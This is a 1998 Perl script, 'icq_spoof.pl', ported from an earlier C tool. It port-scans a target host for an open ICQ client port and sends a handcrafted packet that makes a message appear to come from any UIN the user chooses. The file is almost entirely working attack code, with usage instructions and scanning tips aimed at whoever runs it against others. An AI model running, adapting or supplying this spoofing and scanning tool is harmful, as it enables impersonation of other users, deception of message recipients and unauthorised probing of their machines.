###############################################################################
# icq_spoof.pl - A re-write of icqspoof.c from Seth McGann in Perl.  Requires #
#                the Perl5 socket library, but should work on any Unix you    #
#                can find that's got Perl5 for it... the only system-specific #
#                chunks are the truncate function, and the alarm used to      #
#                make a timeout on the connect().  Runs smoothly under Linux  #
#                2.0.32, Perl 5.003.                                          #
#                                                                             #
#                (C) 1998, Andrew Hobgood [Kha0S@EFNet#LinuxOS]               #
#                                                                             #
#                Based on code from Seth McGann (smm@wpi.edu).  All port scan #
#                code is my own.  If you don't like the way I code, deal with #
#                it.  I wrote this between 2 and 4 in the morning and learned #
#                some pack() syntax along the way.                            #
############################################################################### 
# As for greetz, I'd first like to thank my guinea pigs: gears, magnwa, and   #
# warday.  Thanks to Seth for the dumps and format, EFNet #Perl for helping   #
# with my stupid questions, and to I-don't-know-who for the IceyJ00.  Enjoy.  #
###############################################################################

print "Perl ICQ Spoofer v1.0 - Kha0S [andrewh\@wpi.edu]\n";

# Dumbass... you didn't give us enough arguments.
if($#ARGV-4) {
	print STDERR<<EOH;
Usage: 	$0 <hostname> <UIN> <message> <start port> <end port>

	<hostname>	The target host of the spoofed ICQ message
	<UIN>		The UIN of the spoofed message source
	<message>	The message you want to send (in quotes)
	<start port>	The beginning port to scan for ICQ
	<end port>	The ending port to scan for

Tips:	A good port range is 1000-2000, although 1000-6000 will give you
	more reliable (albeit possibly slower) results.
EOH
	exit(1);
}

use Socket;

$uin = $ARGV[1]; $port = $ARGV[3]-1; $| = 1;
$message = $ARGV[2]; truncate $message, 255;

$proto = getprotobyname('tcp') || 6;
die("gethostbyname: $!") unless ($address = (gethostbyname($ARGV[0]))[4]);

print "Sending spoofed ICQ message to $ARGV[0] from UIN:$ARGV[1]...\n"; 

# This data format is the only stuff that I've really borrowed from icqspoof.c
@uin	= ($uin & 0xFF, ($uin >> 8) & 0xFF, ($uin >> 16) & 0xFF, 0);
$data	= pack('C*', (length($message) + 42) & 0xFF, ((length($message) + 42) >> 8) & 0xFF, (@uin),2,0,0xEE,7,0,0,(@uin),1,0,length($message)+1,0).$message.pack('C*',0,0x82,0xD7,0xF3,32,0x82,0xD7,0xF3,0x20,9,4,0,0,4,0,0,16,1,0xEB,255,255,255,2,0,10,9);

print "Beginning port scan at ", $port+1, " ";
while($port++<=$ARGV[4]) {
	if(&Check_Port($address, $port, $proto)) {
		print "\nFound open port $port!  Sending spoofed data... ";
		syswrite(ICEYJ00, $data, length($data));
		print "done.\n";
		exit(0);
	} else {
		print ".";
	}
}
print "\nOh well... unable to find the ICQ port.  Try again with a different range.\n";
exit(1);

sub Check_Port { my($address, $port, $proto) = @_;
	die("socket: $!") unless socket(ICEYJ00, AF_INET(), SOCK_STREAM(), $proto);
	eval {
# Set up a timeout of 2 seconds on the connect, change to suit taste
		local $SIG{ALRM} = sub { return(0) };
		alarm 2;
		return(defined(connect(ICEYJ00, pack('S n a4 x8', AF_INET(), $port, $address))));
		alarm 0;
	}
}

